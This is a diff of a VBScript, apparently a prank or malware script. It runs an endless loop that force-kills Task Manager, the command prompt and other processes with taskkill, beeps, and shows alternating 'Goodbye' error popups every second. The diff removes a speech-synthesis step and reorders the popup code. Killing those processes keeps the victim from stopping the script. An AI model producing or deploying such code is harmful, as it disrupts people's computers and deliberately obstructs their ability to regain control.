@@ -21,20 +21,9 @@ Set objFSO = Nothing
 ' Create a Shell object
 Set objShell = CreateObject("WScript.Shell")
 
-' Say "Goodbye" and display a message box with alternating icons
+' Say "Goodbye" and terminate various processes on the computer
 i = 1
 Do While True
-    ' Say "Goodbye" using text-to-speech synthesis
-    objShell.Run "PowerShell -Command ""Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Goodbye')""", 0, True
-
-    ' Display a message box with the word "Goodbye" and alternating icons
-    If i Mod 2 = 1 Then
-        objShell.Popup "Goodbye", 0, "Error", &H10
-    Else
-        objShell.Popup "Goodbye", 0, "Information", &H0
-    End If
-    i = i + 1
-
     ' Terminate various processes on the computer
     objShell.Run "taskkill /f /im taskmgr.exe", 0, True
     objShell.Run "taskkill /f /im cmd.exe", 0, True
@@ -45,6 +34,14 @@ Do While True
 
     ' Play a beep sound
     objShell.Run "PowerShell -Command ""[System.Media.SystemSounds]::Beep.Play()""", 0, True
+
+    ' Display a message box with the word "Goodbye" and alternating icons
+    If i Mod 2 = 1 Then
+        objShell.Popup "Goodbye", 0, "Error", &H10
+    Else
+        objShell.Popup "Goodbye", 0, "Information", &H0
+    End If
+    i = i + 1
 
     ' Wait for one second before repeating the loop
     WScript.Sleep 1000
